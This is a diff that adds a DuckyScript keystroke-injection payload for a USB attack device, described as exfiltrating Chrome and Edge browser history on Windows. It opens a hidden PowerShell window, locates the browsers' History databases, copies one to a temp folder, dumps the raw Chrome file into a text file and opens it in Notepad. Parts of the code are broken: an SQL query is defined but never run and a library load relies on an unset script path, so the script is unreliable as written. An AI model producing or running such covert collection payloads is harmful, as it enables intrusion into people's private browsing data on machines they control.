@@ -1,0 +1,30 @@
+REM Author: UNC0V3R3D
+REM Description: Exfiltrates Chrome and Edge browser history to a text file.
+REM Version: 1.0
+REM Category: Recon
+REM Target: Windows 10/11
+DELAY 1000
+GUI r
+DELAY 700
+STRING powershell -windowstyle hidden
+ENTER
+DELAY 1500
+STRING $out = '=== Browser History ===' + [char]10
+ENTER
+STRING $chrome = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History"
+ENTER
+STRING $edge = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\History"
+ENTER
+STRING foreach ($db in @($chrome,$edge)) { if (Test-Path $db) { $tmp = "$env:TEMP\hist_tmp"; Copy-Item $db $tmp -Force; $q = "SELECT url,title,visit_count,last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 100"; Add-Type -Path "$PSScriptRoot\System.Data.SQLite.dll" -EA SilentlyContinue } }
+ENTER
+DELAY 1000
+STRING $out += (Get-Content "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History" -Raw -EA SilentlyContinue) + [char]10
+ENTER
+STRING $out | Out-File "$env:TEMP\browser_history.txt" -Force
+ENTER
+STRING Start-Process notepad "$env:TEMP\browser_history.txt"
+ENTER
+DELAY 2000
+STRING exit
+ENTER
+REM End of payload
